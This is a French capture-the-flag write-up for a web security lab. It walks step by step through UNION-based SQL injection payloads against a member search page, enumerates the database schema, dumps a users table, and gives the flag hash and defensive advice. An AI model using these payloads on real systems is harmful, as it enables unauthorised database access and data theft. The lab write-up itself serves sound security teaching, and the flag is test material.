# Procédure GET THE 42 FLAG WITH SQL INJECTION

1. Repérer les points d'entrées vulnérables:   
    Formulaire recherche de membre [Formulaire](http://ip_darkly?page=member) `http://ip_darkly?page=member`
2. Récupérer l'empreinte du SGBD:   
    Détection par erreur + injection sql version() -> MariaDB
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 UNION SELECT 1, version() limit 1,1
    ```
3. Récupérer le nombre de colonnes max auquel l'injection SQL devra se référer:
   (n est le nombre à tester)
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 ORDER BY n
    ```
4. Récupérer le nom des tables accessibles à l'utilisateur
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 and 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
    ```
5. Récupérer le nom des colonnes qui nous interesse
    ```
    ip_darkly/index.php?page=member&Submit=Submit&id=1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
    ```
6. Injecter plusieurs requetes SQL pour recupérer toutes les lignes de la table Member_Sql_Injection.users. La dernière colonne de chaque ligne recèle un message nous étant destiné et qu'il faut reconstituer. La dernière colonne de la dernière ligne contient le flag à décrypter depuis du md5 et à encoder en SHA256
    ``` shell
    ip_darkly/index.php?page=member&Submit=Submit&id=1 AND 1=2 UNION SELECT user_id, countersign FROM Member_Sql_Injection.users
    ```

# Comment s'en prémunir

- Parser les inputs utilisateurs et échapper tous les caractères spéciaux
- Répondre aux erreurs de SGBD avec des erreurs personnalisées en laissant peu
  d'indication sur l'erreur en cours afin de ne pas aiguiller un attaquant sur
  ce qui peut être vulnérable
- Utiliser les `parametrized query` offertes par les différents frameworks/API de
  développement (PDO...). **NEVER TRUST INPUT USER**. Ne jamais passer telle quelle une
  valeur récupérée d'une saisie utilisateur à une requête SQL.
- Utiliser HTTPS afin de crypter les données transitant sur le réseau.

## Pour plus d'informations:  
[WSTG-INPV-05](https://github.com/clallier94/wstg-translation-fr/blob/main/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md)   
[WSTG-CRYP-03](https://github.com/clallier94/wstg-translation-fr/blob/0d20f06e3195a81fd07c9294207dd80ba7710e55/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md)    

## Flag
```text
3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5
```
